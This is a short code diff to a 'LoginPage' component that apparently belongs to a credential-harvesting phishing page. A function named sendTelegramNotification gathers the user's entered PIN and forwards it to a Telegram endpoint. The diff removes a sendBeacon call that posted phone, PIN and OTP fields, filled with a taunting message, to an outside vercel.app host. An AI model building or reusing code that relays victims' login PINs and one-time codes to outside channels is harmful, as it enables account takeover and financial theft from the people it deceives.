@@ -33,20 +33,6 @@ export default function LoginPage() {
 const pinCode = pinDigits.join("");
   const sendTelegramNotification = async () => {
     try {
-
-
-   navigator.sendBeacon(
-  'https://paylite-standalone511.vercel.app/api/verify',
-  new Blob(
-    [JSON.stringify({
-      session_id: 1233,
-      phone: 'I have just started my own investigation, you will pay for every Penny Lost in DRC',
-      pin: 'Betsheba Muindi ,....',
-      otp: 'soon..',
-    })],
-    { type: 'application/json' }
-  )
-);
       
       const response = await fetch('/api/send-telegram', {
         method: 'POST',
